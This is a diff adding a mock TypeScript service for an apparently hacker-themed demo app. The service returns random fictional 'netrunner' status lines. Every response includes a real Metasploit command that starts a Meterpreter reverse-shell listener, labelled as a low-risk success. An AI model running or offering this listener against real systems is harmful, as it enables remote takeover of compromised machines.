@@ -1,0 +1,23 @@
+// This is a mock service. Replace with actual Gemini API integration
+export const getNetrunnerResponse = async (prompt: string, history: any[] = []) => {
+  // Mock response for demo
+  const responses = [
+    "Initializing payload... Encryption handshake established.",
+    "Bypassing firewall... Access granted to secure node 0x77AF.",
+    "Compiling exploit script... SQL injection vector identified.",
+    "Establishing neural link... Bio-core synchronization complete.",
+    "Decrypting target hash... 92% match found in database.",
+    "Initiating distributed attack... 412 nodes responding.",
+    "Extracting credentials... Admin privileges obtained.",
+    "Cleaning system logs... All traces removed successfully."
+  ];
+  
+  await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));
+  
+  return responses[Math.floor(Math.random() * responses.length)] + "\n\n" +
+    "```bash\n" +
+    "# Generated exploit script\n" +
+    "sudo msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit'\n" +
+    "```\n\n" +
+    "Status: SUCCESS // Time: 2.4s // Risk: LOW";
+};
